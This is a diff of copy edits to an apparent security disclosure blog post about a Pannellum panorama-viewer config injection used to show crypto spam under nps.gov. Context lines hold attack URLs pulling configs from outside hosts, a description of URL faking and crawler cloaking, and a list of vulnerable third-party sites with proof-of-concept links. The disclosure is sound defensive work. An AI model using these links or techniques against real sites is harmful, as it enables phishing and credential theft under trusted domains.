@@ -4,7 +4,7 @@ tags: ["security", "zero-day"]
 comments: []
 ---
 
-The US National Park Service runs nps.gov, a trusted .gov domain on the internet. Right now, if you cilck a special link, your browser address bar shows nps.gov but the page shows crypto spam about Solana NFTs. The page was indexed in Google News. Here is how the entire attack works, step by step.
+The US National Park Service runs nps.gov, a trusted .gov domain on the internet. Through October 2026, a special link made the browser address bar show nps.gov while the page showed crypto spam about Solana NFTs. The page was indexed in Google News. Here is how the entire attack works, step by step.
 
 ![Crypto spam displayed on nps.gov](/assets/images/zero-day-pannellum.webp)
 
@@ -13,7 +13,7 @@ The US National Park Service runs nps.gov, a trusted .gov domain on the internet
 {: .margin-note}
 ⚠️ For live attack URLs, use incognito mode and do not believe anything you see in this window.
 
-Here is a live attack URL:
+Here is the attack URL. Checked on 2026-10-07, the viewer path on nps.gov returns 404:
 
 > https://www.nps(.)gov/hdp/scripts/pannellum/pannellum.htm?config=/\\/cdn.wsscript.com/gov/article/tensor-solana-nft.txt
 
@@ -35,7 +35,7 @@ This issue allows an unauthenticated attacker to use a legitimate domain as the 
 
 An attacker could use this capability to:
 
-- Create convincing phishing, cyrptocurrency, or credential harvesting lures/harvest domain session tokens automatically under certain circumstances, that inherit the credibility of the affected organization. 
+- Create convincing phishing, cryptocurrency or credential-harvesting lures, and under some conditions harvest domain session tokens. Those pages inherit the credibility of the affected organization. 
 - Manipulate page content and browser history to make the malicious instance appear native to the trusted site.
 - Evade detection due to editing the resulting page via the Pannellum config, with resulting attempts to analyze the compromise appearing as a 404 error on the surface.
 - Improve the visibility and credibility of malicious content through search engine indexing, news aggregation, link previews, and AI retrieval systems.
@@ -60,7 +60,7 @@ The nps.gov website hosts [Pannellum](https://pannellum.org/), an open-source pa
 https://www.nps.gov/hdp/scripts/pannellum/pannellum.htm
 ```
 
-This is a legitimate tool used for 360° panorama images of historic sites. Pannellum is designed to accept a `config` query parameter containing the URL of a JSON configuration file. The viewer fetches that JSON via and uses it to set up the panorama display.
+This is a legitimate tool used for 360° panorama images of historic sites. Pannellum is designed to accept a `config` query parameter containing the URL of a JSON configuration file. The viewer fetches that JSON and uses it to set up the panorama display.
 
 Here is what this widget is supposed to look like when it is working. It is beautiful.
 
@@ -123,7 +123,7 @@ This fetches a second (HTML) file from the attacker's server and calls `document
 
 ### Step 5: The replacement page fakes the URL and serves content.
 
-The injected HTML page does a few things;
+The injected HTML page does a few things:
 
 1. **Rewrites the visible URL** using `history.replaceState()` to change the path to `/defi/tensor-solana-nft`, making the address bar look even more like a real nps.gov page. This is more believable.
 2. **Detects search engine crawlers** with a regex check for `googlebot|bingbot|adsbot` in the user agent. If a crawler visits, the page serves clean content optimized for search indexing. Human visitors get the full replacement.
@@ -134,7 +134,7 @@ We have deployed a configuration file to prove the effect without any harm. This
 
 [https://apps.phor.net/csh-panorama/config-pannellum2.php](https://apps.phor.net/csh-panorama/config-pannellum2.php)
 
-It is designed to study and avoids the obfuscation of the real attacks.
+It is built for study, and it avoids the obfuscation of the real attacks.
 
 ```php
 <?php
@@ -174,7 +174,7 @@ This list may be outdated by the time you read this.
 - <https://www.inceptapharma.com/vtours-xs/index.html?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
 - <https://cdn.biola.edu/event_services/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
 - <https://www.keele.ac.uk/docs/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
-- <https://library.missouri.edu/code/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
+- `https://library.missouri.edu/code/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php`
 - <https://www.hrr.mlit.go.jp/360/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
 - <https://www.bu.edu/housing/wp-content/themes/r-housing/js/vendor/pannellum/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
 - <https://www.hoteldealborada.com/scw/pannellum.htm?config=/\\/apps.phor.net/csh-panorama/config-pannellum.php>
@@ -227,7 +227,7 @@ February 2026 through October 2026
 
 ## Acknowledgements
 
-Thank you to the many contributors here for preparing command line approaches, looking up contact information, discussing the ethical approach we are using here and providing the motivation to get through an afternoon to help some random other souls out there who's websites might be misconfigured. 
+Thank you to the many contributors here for preparing command line approaches, looking up contact information, discussing the ethical approach we are using here and providing the motivation to get through an afternoon to help some random other souls out there whose websites might be misconfigured. 
 
 - William Entriken [https://x.com/fulldecent](https://x.com/fulldecent) 
 - Christy Caraballo [https://x.com/pwncmd](https://x.com/pwncmd)
